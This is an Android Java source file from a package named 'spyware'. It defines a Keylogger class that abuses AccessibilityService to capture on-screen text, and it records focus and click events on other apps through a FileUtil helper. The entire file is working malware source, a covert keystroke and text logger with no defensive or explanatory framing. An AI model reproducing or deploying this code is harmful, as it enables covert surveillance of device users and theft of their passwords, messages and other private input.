package com.example.cristianturetta.spyware;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class Keylogger extends AccessibilityService{

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        FileUtil fileUtil = FileUtil.getInstance();

        switch(accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(TEXT)|" + data + "\n");
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(FOCUSED)|" + data + "\n");
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(CLICKED)|" + data + "\n");
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
